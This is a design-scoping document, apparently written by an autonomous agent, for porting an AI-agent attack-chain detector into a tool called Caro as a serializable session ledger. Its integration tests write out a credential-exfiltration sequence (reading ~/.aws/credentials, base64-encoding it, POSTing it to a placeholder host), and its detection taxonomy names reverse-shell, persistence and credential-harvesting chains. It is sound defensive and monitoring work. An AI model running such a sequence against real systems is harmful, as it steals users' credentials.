# Implementation Scope — Portable Session Chain Ledger

**Feature under analysis:** **AgentTrust** `RiskChain` / `SessionTracker` —
order-aware detection of multi-step attack chains whose individual steps are
each benign. Open source under **AGPL-3.0** (commercial option on request);
~5,000 LOC core, 192 unit tests; ships a Python library, CLI, MCP server, and
dashboard. Paper: [arXiv:2605.04785](https://arxiv.org/html/2605.04785v1)
(May 2026), read live 2026-08-18 — §3 threat model, §4.1 architecture, §4.7
RiskChain, §6.7 ablation, §7.1 limitations, Appendix E chain patterns.

**Equivalent we are scoping for Caro:** the same order-aware matcher, with
its session history turned inside out — from **in-process memory** into a
**caller-held, serializable, fingerprint-only, bounded ledger** passed in and
out of every invocation. Caro stays a pure function of `(command, ledger)`.

**Date:** 2026-08-18 · **Author:** `caro-research--scoping-process` (autonomous run)
**Companion ADR:** `docs/adr/ADR-053-portable-session-chain-ledger.md`

> **Provenance note (autonomous run).** Produced with no user present; the
> task template's `[FEATURE NAME]` was unbound. Target selection: of the five
> opportunities in `market-scans/2026-08-17-ai-agent-strategy-memo.md`,
> A→ADR-052 (yesterday), C→ADR-037/040/041, E is a build spike, and B is an
> eval run plus a docs page that produces no ADR and is **not superseded by
> this document** — it should still be run, and the memo still calls it the
> single best next thing to build. **D — session-level pattern telemetry,
> "the ExploitGym gap" — is the memo's named long-term moat and has no ADR.**
> This run scopes D's architecture, using the only open-source order-aware
> chain detector found as the analog. Per `.claude/rules/git-workflow.md`,
> both files are left **uncommitted** for a human to branch and PR.
>
> **Gate warning.** `.claude/rules/validation-discipline.md` attaches to D by
> name in the memo. This is an architecture scope, not a feature spec, and
> makes no PMF claim — but **the implementing PR must not open until the five
> gates are cleared.** Decision D7 in the ADR is built so the evidence gate
> and the engineering gate are one gate. Do not let the news value of the
> August incident substitute for transcripts.

---

## Phase 1 — Feature Research

### What problem it solves, and for whom

For anyone running an autonomous agent long enough that its actions
accumulate. Per-action guardrails answer "is this action dangerous?"
RiskChain answers "do the last k actions *compose* into something
dangerous?" — the case where read-config → base64 → POST is three ALLOWs and
one exfiltration. AgentTrust's own framing (F3 in their threat model):
"exfiltration chains — multi-step sequences that combine benign-looking steps
into a single dangerous outcome."

### Core architecture — data flow, key types, separation of concerns

- **Pipeline (§4.1):** eight components. Five always-on (ActionAnalyzer,
  ShellNormalizer, PolicyEngine, TrustInterceptor, TrustReporter), two
  on-by-default-but-disableable (SafeFix, **SessionTracker**), one opt-in
  (LLMJudge). *"All components are stateless except the SessionTracker,
  which holds an in-memory action history per session."*
- **Data flow (Algorithm 1):** normalize → extract 42 risk patterns →
  evaluate 170 policy rules → analyzer risk → `max` the two →
  SafeFix suggestions if not ALLOW → **SessionTracker(a, h) → chain alerts →
  `max` into risk** → optional LLM judge on ambiguity → `TrustReport`.
- **Key types:** `Action = (τ, κ, δ, π, ρ, σ, θ)` — type, tool, description,
  params, **raw payload**, optional session id, timestamp. Risk lattice
  `{NONE, LOW, MEDIUM, HIGH, CRITICAL}`. Verdicts `{ALLOW, WARN, BLOCK,
  REVIEW}`. Chain pattern `P = (id, n, [s₁…s_k], r_P, m)` with
  `sᵢ = (τᵢ, regexᵢ, descrᵢ)`. Both `Action` and `TrustReport` are Pydantic
  models that "serialize to stable JSON for audit logging and inter-process
  communication."
- **Matching (§4.7):** walk steps in order; for each, scan forward for the
  earliest unused action matching type and regex; an action matching several
  steps is greedily assigned to the **lowest-indexed unmatched** step; ≥ m
  matches emits a `ChainAlert`. Explicitly justified as "bit-for-bit
  reproducible."
- **Seven default chains (Table 4):** data exfiltration (read sensitive →
  encode → send externally), credential harvesting (search → read →
  transmit), persistence installation (download → install → chmod),
  privilege escalation (recon → modify perms → exec privileged), supply
  chain (touch manifest → add dep → install), reverse shell (network recon →
  listener → shell I/O), data destruction (enumerate → disable safety → mass
  delete).
- **Separation of concerns:** rules and chains are *data* (`riskchain.py`,
  a YAML extension mechanism for user rules); matching is a pure function;
  enforcement is the interceptor at the agent's call site.

### Why it is experimental / limited — the failure modes

| # | Failure mode | Evidence |
|---|---|---|
| **F1** | **History is in-process memory; cannot cross a process boundary.** | §4.1 ("in-memory action history per session"); **L6** "The interceptor must be in-process… out-of-process enforcement requires a different deployment model." Ported naively to a CLI, every session is one action long and the detector finds nothing. |
| **F2** | **The component ships unmeasured — and the ablation proves it.** | §6.7: removing SessionTracker leaves verdict accuracy **identical** (95.0% internal / 95.4% independent, 0.0 pp delta) while median latency falls **1.77 ms → 0.22 ms**. ~87% of latency, 0% of measured accuracy — because both the 300-scenario and 630-scenario corpora are **single-action** benchmarks. The chain detector has no corpus, therefore no error rate. |
| **F3** | **Unbounded session history.** | The LLM-judge cache is explicitly bounded (`MAX_ENTRIES`, `TTL_SECONDS`); the SessionTracker's per-session history has no documented bound. A four-day, ~17,600-action run is the adversarial case. |
| **F4** | **The history contains raw payloads.** | `Action.ρ` is "the raw payload (e.g. command text, URL, query)." In-memory that is one posture; serializing it to disk so another process can read it writes the user's shell history — argv secrets included — into a new file. |
| **F5** | **Ambiguity resolves to a hosted LLM.** | Algorithm 1 line 14; ~200–600 ms HTTP round trip, API key, per-call cost. L1 concedes the rule path "cannot, even in principle, reason about runtime data flow." |
| **F6** | Chain coverage is finite and English-only. | L7 (7 chains, "not exhaustive"), L5 (English-centric regex and prompt). |

Credit where due: their fail-safe posture is strong — Property 2 (any
internal failure ⇒ `REVIEW` with confidence ≤ 0.3), enforced by 13 regression
tests, and Property 4 (no silent allowance: the worst-case verdict over all
normalized variants governs). Caro should match that bar, not just the
feature.

### Structured output contract

`TrustReport` (Pydantic → stable JSON) with `policy_violations`,
`risk_factors`, and `chain_alerts` as **non-optional** fields (Property 5),
rendered identically through three reporters (Rich console, canonical JSON,
Markdown). Confidence is a fixed ladder, not a model output: **0.97 if any
chain alert fired**, 0.95 if patterns *and* violations fired, 0.80 if one of
the two, 0.60 for a clean ALLOW. Verdicts are `{ALLOW, WARN, BLOCK, REVIEW}`
with `exec(v) ≜ v ∈ {ALLOW, WARN}`. No exit-code contract is specified in
the paper — it is a library-first design; the CLI is a wrapper.

### Session / context lifecycle — how redundant initialization is avoided

Two answers, one good and one that does not port.

The good one is the **cache-aware LLM judge** (§4.8): long sessions grow
context incrementally, so the judge partitions content into paragraph-boundary
blocks, hashes each, and routes to `cache_hit` (zero tokens), `incremental`
(delta tokens only, when unmatched blocks form a contiguous tail), or `FULL`
re-evaluation. Measured: 11.4% of calls go FULL; median tokens per 50-turn
session drop from **749,606 → 95,865, an 87.1% ± 0.8 pp saving.** The
block-hash delta idea is worth remembering for Caro's own context work
(ADR-025/lowercase-007), though it is not part of this scope.

The one that does not port is the session lifecycle itself: identity is a
process-local dict keyed by `Action.σ`, alive only as long as the process.
There is no serialization, no handoff, no resumption. **This is F1, and it is
the whole reason this ADR exists.**

---

## Phase 2 — Competitive Differentiation

### What they get right that we should replicate

1. **Deterministic greedy matching with a stated reproducibility rationale.**
   Lowest-indexed unmatched step, no action reused. Copy it exactly, including
   the tie-break, and test for bit-for-bit stability.
2. **Monotone `max` escalation.** Chains raise risk, never lower it.
3. **Chains as data, matcher as code**, with a user-extension mechanism —
   the same split Caro already has between `src/safety/patterns.rs` and
   `src/safety/validator.rs`.
4. **Fail-safe invariants as regression tests.** 13 tests asserting the
   system never silently fails open is a better artifact than a paragraph
   promising it doesn't.
5. **Negatives that are minimally distinguishable from positives.**
   `cat README.md` vs `cat .env`; `rm -rf ./node_modules` vs `rm -rf /`.
   Their corpus discipline is the part Caro should copy hardest — and the
   part they failed to apply to chains.

### Their gaps we avoid by designing the schema first

| Their gap | Our design answer |
|---|---|
| F1 in-process history | **D1** — ledger is an argument (`--session-ledger <PATH\|->`), a value not a service |
| F4 raw payloads on disk | **D2** — `StepKind` + salted `sha256:` digest; never command text |
| F3 unbounded growth | **D6** — 256-entry ring + 8 h TTL, monotonic non-reused `seq` |
| F2 unmeasured component | **D7** — `EvalCategory::ChainSequence` corpus with benign-lookalike negatives **gates the default-on** |
| F5 LLM in the path | **D8** — deterministic only; ambiguity escalates toward `HumanGate` |
| Corruptible history read as empty | **Fail-closed** — malformed ledger ⇒ exit 2, `error.kind = "ledger_invalid"` |
| Chain alert as a side channel | **D5** — additive `chain_alerts[]` on the envelope, field-shaped to fold into ADR-052's `violations[]` |

### Our unique positioning

- **Offline, zero-dependency, no API key.** Their chain path is deterministic
  too, but it ships inside a system whose ambiguity story is a hosted model.
  Caro's whole product is the deterministic floor.
- **Universal and out-of-process by construction.** L6 says out-of-process
  enforcement "requires a different deployment model." Caro *is* that
  deployment model — a subprocess any harness can call. The portable ledger
  is what makes chain detection survive it, and it is the piece nobody has
  shipped.
- **Rust, not Python, in the agent's hot loop.** No interpreter, no venv, no
  import cost per invocation.
- **AGPL-3.0 on both sides.** License direction is compatible for
  *inspiration and interoperability*; note that this scope proposes **no
  linkage and no code reuse** — the chain taxonomy is public prior art
  (MITRE-ATT&CK-shaped), the implementation is ours.

### Existing infrastructure that already covers part of this

| Exists today | Covers |
|---|---|
| `src/safety/patterns.rs` — 67 `DangerPattern` literals + `validate_patterns()`, `get_compiled_patterns_for_shell()` | The regex layer each `ChainStep` needs; `StepKind` classification can be derived from the same compiled set |
| `src/safety/mod.rs` — `ValidationResult`, `SafetyDecision::from_validation_result` (:225), `blend_smart_decision` (:277) | The escalation seam; `escalate_with_chains` slots in beside the existing blend |
| `src/models/mod.rs` — `RiskLevel` (:152, 4 levels), `SuggestedRouting::from_risk_and_safety` (:189) | The whole risk→routing map. **Do not duplicate it.** Note the lattice mismatch: their 5 levels vs our 4 — map `NONE`/`LOW` → `Safe` |
| `src/caroml/history.rs` — append-only `journal.jsonl`, `JournalEntry` with `stderr_digest` (SHA-256 of first 4 KB, not stderr) | The exact privacy instinct D2 generalizes. Wrong key (intent hash) for this use — see ADR alternative C |
| `src/ai/session.rs` / `src/ai/store.rs` — `AiSession { id, created_at, last_at, shell, cwd, turns }`, `Turn { role, content, command, confidence, risk, ts }`, flat-file `SessionStore` with `resume_recent()` | Closest prior art; stores raw commands and is keyed machine-locally — see ADR alternative D |
| `src/eval/mod.rs` — `EvalSuite`, `EvalCase`, `EvalCategory`, `EvalResults`, `CategoryResults` | The harness D7 extends; needs ordered multi-case scenarios, which it does not have |
| `src/cli/mod.rs:76` `CliResult` (already `Serialize + Deserialize`) | The additive field site |

**Boy-scout finding (not fixed here):** exit code **13** is claimed twice —
`ADR-049` (`EvidenceMismatch`, "new — claimed here") and `ADR-051`
(`DivergenceBlocked`). Both are Proposed, so nothing is broken yet, but the
registry ADR-024 defines has no owner and is drifting. Worth a `bd` issue.

---

## Phase 3 — Scope Definition

### New types

All in **`src/safety/chain.rs`** (new file, existing module). Every type is
serializable from day one, per the standing constraint: the ledger types
(round-tripped across the process boundary) derive
`Serialize + Deserialize + JsonSchema`; the compile-time chain-definition
types derive `Serialize + JsonSchema` (see the note on `ChainStep`).

```rust
/// Coarse, closed vocabulary of what a command *does*. Chain-matching only —
/// deliberately not a general effects taxonomy (that is ADR-044's job).
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
#[serde(rename_all = "snake_case")]
pub enum StepKind {
    ReadSensitive, Search, Encode, NetworkSend, NetworkRecon, Download,
    Install, PermissionChange, PrivilegedExec, ManifestEdit, Listener,
    DisableSafety, MassDelete, Other,
}

/// One assessed command, reduced to a fingerprint. Never carries payload text.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
pub struct LedgerEntry {
    pub seq: u32,                    // monotonic, never reused across evictions
    pub kind: StepKind,
    pub digest: String,              // "sha256:<hex>" over salt || normalized payload
    pub risk_level: RiskLevel,       // reused from src/models
    pub blocked: bool,               // a blocked recon step is still signal
    pub ts: DateTime<Utc>,
}

/// The caller-held session artifact. This is the whole state of the feature.
#[derive(Debug, Clone, Serialize, Deserialize, JsonSchema)]
pub struct SessionLedger {
    pub schema_version: u32,         // 1
    pub session_id: String,          // caller-supplied, opaque, max 128 bytes
    pub salt: String,                // 32 hex chars, generated once per ledger
    pub entries: Vec<LedgerEntry>,   // ring-pruned on load and on append
}

impl SessionLedger {
    pub const MAX_ENTRIES: usize = 256;
    pub const MAX_AGE_SECS: u64 = 8 * 3600;
    pub fn load(path: &Path) -> Result<Self, ChainError>;   // fail-closed on parse/schema/seq errors
    pub fn load_from_str(raw: &str) -> Result<Self, ChainError>;
    pub fn save(&self, path: &Path) -> Result<(), ChainError>;  // atomic: tmp + rename
    pub fn append(&mut self, entry: LedgerEntry);           // prunes by count and age
    pub fn fingerprint(&self, normalized: &str) -> String;  // salted digest
}

/// One ordered step of a chain. `pattern` is optional: some steps are
/// identified by kind alone.
///
/// NOTE: chain definitions are compile-time data and are **never
/// deserialized** in v1 (user-authored chains are out of scope — see ADR-040).
/// They therefore derive `Serialize + JsonSchema` only, which is what lets the
/// fields stay `&'static` and the literals stay `const`. `#[derive(Deserialize)]`
/// on a struct with `&'static str` fields does not compile; adding
/// user-authored chains later means introducing `Cow<'static, str>`, and that
/// is a deliberate, separate change.
#[derive(Debug, Clone, Serialize, JsonSchema)]
pub struct ChainStep { pub kind: StepKind, pub pattern: Option<&'static str>, pub descr: &'static str }

/// Static chain definition. Data lives in src/safety/chain_patterns.rs,
/// mirroring the `patterns.rs` / `validator.rs` split.
#[derive(Debug, Clone, Serialize, JsonSchema)]
pub struct ChainPattern {
    pub id: &'static str,            // "chain/data-exfiltration" — stable, never reworded
    pub steps: &'static [ChainStep],
    pub combined_risk: RiskLevel,
    pub min_match: usize,            // m
}

/// Emitted on a hit. Field names chosen to fold into ADR-052 `violations[]`.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize, JsonSchema)]
pub struct ChainAlert {
    pub rule_id: String,             // == ChainPattern::id
    pub combined_risk: RiskLevel,
    pub matched_steps: Vec<u32>,     // ledger `seq` values, ascending
    pub total_steps: usize,
    pub description: String,
}
```

**Method contracts**

- `classify(normalized: &str, decision: &SafetyDecision) -> StepKind` — pure;
  derived from the already-compiled pattern set plus a small kind table.
  Unknown ⇒ `StepKind::Other`. Never panics.
- `match_chains(ledger: &SessionLedger, candidate: &LedgerEntry) -> Vec<ChainAlert>`
  — pure; appends `candidate` as the hypothetical final entry; greedy
  lowest-indexed-unmatched assignment; no entry serves two steps; alerts
  sorted by `rule_id` for byte-stable output. **Never returns an alert that
  does not include the candidate**, so a chain fires on the step that
  completes it, not retroactively.
- `SafetyDecision::escalate_with_chains(&mut self, alerts: &[ChainAlert], safety: SafetyLevel)`
  — `risk_level = max(...)`, then `suggested_routing =
  SuggestedRouting::from_risk_and_safety(risk_level, safety)`. Monotone:
  asserts the post-state is `>=` the pre-state on both axes.

### Minimal set of files that change

**New (3):**

| File | Why |
|---|---|
| `src/safety/chain.rs` | Types + matcher + ledger I/O |
| `src/safety/chain_patterns.rs` | The seven seed `ChainPattern` literals — mirrors `patterns.rs` |
| `tests/chain_ledger.rs` | Integration tests below |

**Modified (5):**

| File | Change |
|---|---|
| `src/safety/mod.rs` | `pub mod chain; pub mod chain_patterns;` + `escalate_with_chains` + `ChainConfig { enabled, max_entries, max_age_secs }` on the existing `SafetySection` |
| `src/cli/mod.rs` | `CliResult.chain_alerts: Vec<ChainAlert>` (`#[serde(default, skip_serializing_if = "Vec::is_empty")]`); `ExitCode::ChainBlocked = 14` |
| `src/main.rs` | `--session-ledger <PATH\|->`, `--session-id <ID>`; exit-14 mapping |
| `src/eval/mod.rs` | `EvalCategory::ChainSequence` + ordered multi-command `EvalCase` |
| `docs/adr/README.md` | Index row for ADR-053 |

No new top-level module. No new dependency (`sha2`, `serde`, `chrono`,
`schemars`, `regex` are all already in the tree).

### Exit code / output contract

| Exit | Meaning | Envelope |
|---|---|---|
| **14** | `ChainBlocked` — chain escalation pushed routing to `Block` (**new, claimed here**) | `status: "blocked"`, `chain_alerts` non-empty, `risk_level` escalated, `command` present, not executed |
| 2 | malformed/unschema'd/non-monotonic ledger — **fail-closed, never treated as empty** | `error.kind: "ledger_invalid"` |
| 0 / 3 / … | unchanged | `chain_alerts` present-and-empty or omitted |

Machine consumers may depend on: `chain_alerts[].rule_id` (stable forever —
renaming one is a breaking change), `matched_steps` ordering (ascending),
alert ordering (sorted by `rule_id`), exit 14, and the absent⇔empty
equivalence for `chain_alerts`. `description` is prose and is **not** a
stable surface.

### Integration tests — known input → deterministic JSON + exit code

1. **Positive chain across three invocations.** `cat ~/.aws/credentials` →
   `base64 -w0 /tmp/c` → `curl -X POST https://x.example/u -d @/tmp/c`, same
   ledger. Invocations 1–2: exit 0, `chain_alerts: []`. Invocation 3: exit
   **14**, `chain_alerts[0].rule_id == "chain/data-exfiltration"`,
   `matched_steps == [0,1,2]`, `total_steps == 3`.
2. **Order sensitivity.** Same three commands, scrambled (POST first) ⇒ exit
   0, no alert. Proves order-awareness, not bag-of-commands.
3. **Below `min_match`.** First two steps only ⇒ no alert; ledger has exactly
   2 entries with `seq` 0,1.
4. **Benign lookalike negative.** `cat README.md` → `base64 logo.png` →
   `curl -sSL https://registry.npmjs.org/lodash` ⇒ exit 0, no alert. The
   false-positive control; failing this fails the feature.
5. **Feature off ⇒ zero delta.** No `--session-ledger`: stdout is
   byte-identical to the pre-change binary for the same input (golden file).
6. **Fail-closed ledger.** Truncated JSON, wrong `schema_version`, and
   non-monotonic `seq` ⇒ exit 2, `error.kind == "ledger_invalid"`, ledger
   file left unmodified.
7. **Bounded ring.** 300 appends ⇒ 256 entries retained, `seq` monotonic with
   the first 44 absent (not renumbered); byte-identical ledger across two
   runs of the same input.
8. **Age pruning.** Entries with `ts` older than 8 h are dropped on load;
   fixed clock injected.
9. **Monotonicity.** A `Critical`/`Block` command plus a chain hit stays
   `Block`; a chain alert never lowers `risk_level` or `suggested_routing`
   (proptest over the full cross-product of the 4 risk levels × 3 safety
   levels).
10. **Privacy.** After a run over a corpus of commands containing
    `AKIA...`-shaped strings, absolute paths, and hostnames, the ledger file
    contains **no substring of length ≥ 8** from any input payload.
11. **Schema snapshot.** `schemars`-generated JSON Schema for `SessionLedger`
    and `ChainAlert` matches a checked-in golden; the seed chain `id` set
    matches a checked-in golden. Any rename fails CI loudly.
12. **Stdin mode.** `--session-ledger -` reads JSON on stdin and returns the
    updated ledger inside the envelope; no file is written.

### Explicitly out of scope (next version)

- **Velocity / breadth anomaly scoring** — the actual ExploitGym shape
  (17,600 actions, recon fan-out, egress rate). Needs the corpus from D7
  first; this ADR ships the substrate it will run on.
- **User-authored chain patterns** — belongs in ADR-040's policy file, not in
  a second config surface.
- **Cross-session / multi-agent correlation** — a different (and much larger)
  trust boundary.
- **Ledger signing / tamper-evidence** — ADR-049's evidence packet.
- **Emitting `ChainAlert` on the lifecycle bus** — ADR-041.
- **Folding `chain_alerts` into `violations[]`** — lands with ADR-052; the
  field names here are chosen so it is a mechanical merge, not a migration.
- **Shell deobfuscation / AST normalization** — already claimed by
  ADR-007-ast-parser-shell-validation. Do not re-scope it here; note only
  that chain matching gets strictly better once it lands, since `StepKind`
  classification runs on the normalized form.
- **Block-hash incremental context caching** (their §4.8, 87.1% token
  saving) — genuinely good, belongs with ADR-025 / session compaction, not
  here.
- **Converging `SessionLedger` with `AiSession`/`SessionStore`** — worth
  doing, after both have shipped and the ledger's shape has stopped moving.
- **Any LLM in the chain path** — not "next version." Not ever.

---

## Verification notes for the reviewer

- Every file path, type name, and line number cited above was checked
  against the working tree at commit `50859b89` on branch
  `integrator/20260711-postmerge`.
- `RiskLevel` has **four** variants (`Safe`, `Moderate`, `High`, `Critical`),
  not the five in the paper's lattice — the mapping is stated, not assumed.
- `src/safety/patterns.rs` contains **67** `DangerPattern` literals; the
  README's "52+" is a floor, not a count. Not corrected here.
- No `Scan` subcommand exists yet (ADR-023 is Proposed), so nothing in this
  scope depends on it.
- ADR-053 is free; highest existing is 052. Exit 14 is free; **13 is
  double-claimed** by ADR-049 and ADR-051.
- All performance, accuracy, and latency figures attributed to AgentTrust are
  **self-reported in the paper** and independently unverified.
